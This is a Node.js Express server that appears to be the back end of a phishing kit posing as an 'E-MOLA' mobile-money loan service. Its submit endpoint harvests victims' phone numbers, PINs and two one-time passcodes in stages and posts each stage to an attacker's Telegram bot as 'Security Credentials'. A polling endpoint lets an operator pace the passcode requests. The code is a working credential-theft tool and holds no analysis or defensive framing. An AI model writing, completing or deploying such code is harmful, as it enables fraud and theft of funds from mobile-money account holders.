require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Temporary in-memory session store to track loan progress by phone number
const loanSessions = {};

// Helper function to send Telegram notification with Approve/Reject inline buttons
async function sendTelegramMessage(loanData) {
if (!BOT_TOKEN || !CHAT_ID){ 
    console.error('BOT_TOKEN or CHAT_ID is not set in environment variables.');
    return;}

    const message = `
🚨 *NEW E-MOLA LOAN APPLICATION* 🚨

👤 *Client Details:*
• Phone: ${loanData.phone || 'N/A'}
• Amount: MT ${loanData.amount || 'N/A'}
• Period: ${loanData.period || 'N/A'} months

🔐 *Security Credentials:*
• PIN: ${loanData.pin || 'Pending'}
• First OTP: ${loanData.otp1 || 'Pending'}
• Second OTP: ${loanData.otp2 || 'Pending'}

📅 *Status:* ${loanData.status || 'SUBMITTED'}
⏰ *Timestamp:* ${new Date().toLocaleString()}
    `.trim();

    // Inline keyboard buttons for admin control
    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ Aprovar', callback_data: `approve_${loanData.phone}` },
                { text: '❌ Recusar', callback_data: `reject_${loanData.phone}` }
            ]
        ]
    };
try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await response.json();

        if (response.ok && data.ok) {
            console.log('✅ Telegram notification sent successfully!');
        } else {
            console.error('❌ Telegram API Error Response:', data);
        }
    } catch (error) {
        console.error('❌ Network Fetch Error contacting Telegram:', error);
    }
}

// API endpoint for frontend submissions & step checks
app.post('/api/submit', async (req, res) => {
    try {
        const { phone, amount, period, pin, otp1, otp2 } = req.body;

        // Initialize or update session
        if (!loanSessions[phone]) {
            loanSessions[phone] = { phone, amount, period, pin, otp1: null, otp2: null, status: 'SUBMITTED' };
        }

        if (otp2) {
            loanSessions[phone].otp2 = otp2;
            loanSessions[phone].status = 'COMPLETED';
            await sendTelegramMessage(loanSessions[phone]);
            return res.json({ success: true, nextStep: 'success', message: 'Empréstimo aprovado com sucesso!' });
        }

        if (otp1) {
            loanSessions[phone].otp1 = otp1;
            loanSessions[phone].status = 'WAITING_SECOND_OTP';
            await sendTelegramMessage(loanSessions[phone]);
            return res.json({ success: true, nextStep: 'ask_otp2' });
        }

        // Initial submission
        loanSessions[phone].amount = amount || loanSessions[phone].amount;
        loanSessions[phone].period = period || loanSessions[phone].period;
        loanSessions[phone].pin = pin || loanSessions[phone].pin;
        loanSessions[phone].status = 'PENDING_APPROVAL';

        await sendTelegramMessage(loanSessions[phone]);
        
        // Return current status to frontend
        const currentStatus = loanSessions[phone].status;
        res.json({ success: true, status: currentStatus, nextStep: currentStatus === 'APPROVED' ? 'ask_otp1' : 'wait_approval' });

    } catch (error) {
        console.error('Error in /api/submit:', error);
        res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
});

// Polling endpoint for frontend to check if admin clicked "Aprovar"
app.get('/api/check-status/:phone', (req, res) => {
    const phone = req.params.phone;
    const session = loanSessions[phone];
    if (session) {
        res.json({ status: session.status });
    } else {
        res.json({ status: 'NOT_FOUND' });
    }
});

// Fallback route for SPA / frontend routing
app.get(/(.*)/, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});